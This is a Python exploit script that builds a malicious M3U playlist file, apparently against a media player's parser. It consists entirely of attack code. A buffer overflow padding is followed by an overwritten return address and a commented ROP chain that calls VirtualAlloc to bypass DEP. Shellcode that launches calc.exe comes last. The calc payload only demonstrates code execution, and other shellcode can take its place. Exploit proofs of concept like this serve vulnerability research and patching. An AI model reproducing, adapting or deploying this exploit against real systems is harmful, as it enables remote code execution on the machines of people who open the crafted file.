#!/usr/bin/python
 
import sys, struct
 
file="crash.m3u"

rop = struct.pack('<L',0x41414141)  # padding to compensate 4-bytes at ESP
rop += struct.pack('<L',0x10029b57) # POP EDI # RETN
rop += struct.pack('<L',0x1002b9ff) # ROP-Nop
                                    #-----------------------------------------[ROP-Nop -> EDI]-#
rop += struct.pack('<L',0x100280de) # POP ECX # RETN
rop += struct.pack('<L',0xffffffff) # will become 0x40
rop += struct.pack('<L',0x1002e01b) # INC ECX # MOV DWORD PTR DS:[EDX],ECX # RETN
rop += struct.pack('<L',0x1002e01b) # INC ECX # MOV DWORD PTR DS:[EDX],ECX # RETN
rop += struct.pack('<L',0x1002a487) # ADD ECX,ECX # RETN
rop += struct.pack('<L',0x1002a487) # ADD ECX,ECX # RETN
rop += struct.pack('<L',0x1002a487) # ADD ECX,ECX # RETN
rop += struct.pack('<L',0x1002a487) # ADD ECX,ECX # RETN
rop += struct.pack('<L',0x1002a487) # ADD ECX,ECX # RETN
rop += struct.pack('<L',0x1002a487) # ADD ECX,ECX # RETN
                                    #--------------------------------[flProtect (0x40) -> ECX]-#
rop += struct.pack('<L',0x1002ba02) # POP EAX # RETN
rop += struct.pack('<L',0x1005d060) # kernel32.virtualalloc
rop += struct.pack('<L',0x10027f59) # MOV EAX,DWORD PTR DS:[EAX] # RETN
rop += struct.pack('<L',0x1005bb8e) # PUSH EAX # ADD DWORD PTR SS:[EBP+5],ESI # PUSH 1 # POP EAX # POP ESI # RETN
                                    #------------------------------------[VirtualAlloc -> ESI]-#
rop += struct.pack('<L',0x1003fb3f) # MOV EDX,E58B0001 # POP EBP # RETN
rop += struct.pack('<L',0x41414141) # padding for POP EBP
rop += struct.pack('<L',0x10013b1c) # POP EBX # RETN
rop += struct.pack('<L',0x1A750FFF) # ebx+edx => 0x1000 flAllocationType
rop += struct.pack('<L',0x10029f3e) # ADD EDX,EBX # POP EBX # RETN 10
rop += struct.pack('<L',0x1002b9ff) # Rop-Nop to compensate
rop += struct.pack('<L',0x1002b9ff) # Rop-Nop to compensate
rop += struct.pack('<L',0x1002b9ff) # Rop-Nop to compensate
rop += struct.pack('<L',0x1002b9ff) # Rop-Nop to compensate
rop += struct.pack('<L',0x1002b9ff) # Rop-Nop to compensate
rop += struct.pack('<L',0x1002b9ff) # Rop-Nop to compensate
                                    #-----------------------[flAllocationType (0x1000) -> EDX]-#
rop += struct.pack('<L',0x100532ed) # POP EBP # RETN
rop += struct.pack('<L',0x100371f5) # CALL ESP
                                    #----------------------------------------[CALL ESP -> EBP]-#
rop += struct.pack('<L',0x10013b1c) # POP EBX # RETN
rop += struct.pack('<L',0xffffffff) # will be 0x1
rop += struct.pack('<L',0x100319d3) # INC EBX # FPATAN # RETN
rop += struct.pack('<L',0x100319d3) # INC EBX # FPATAN # RETN
                                    #------------------------------------[dwSize (0x1) -> EBX]-#
rop += struct.pack('<L',0x10030361) # POP EAX # RETN
rop += struct.pack('<L',0x90909090) # NOP
                                    #---------------------------------------------[NOP -> EAX]-#
rop += struct.pack('<L',0x10014720) # PUSHAD # RETN
                                    #----------------------------------------[PUSHAD -> pwnd!]-#


calc = (
"\x31\xD2\x52\x68\x63\x61\x6C\x63\x89\xE6\x52\x56\x64"
"\x8B\x72\x30\x8B\x76\x0C\x8B\x76\x0C\xAD\x8B\x30\x8B"
"\x7E\x18\x8B\x5F\x3C\x8B\x5C\x1F\x78\x8B\x74\x1F\x20"
"\x01\xFE\x8B\x4C\x1F\x24\x01\xF9\x42\xAD\x81\x3C\x07"
"\x57\x69\x6E\x45\x75\xF5\x0F\xB7\x54\x51\xFE\x8B\x74"
"\x1F\x1C\x01\xFE\x03\x3C\x96\xFF\xD7")
 
crash = "http://." + "A"*17416 + "\x60\x9c\x01\x10" + rop + calc + "C"*7572
 
writeFile = open (file, "w")
writeFile.write( crash )
writeFile.close()
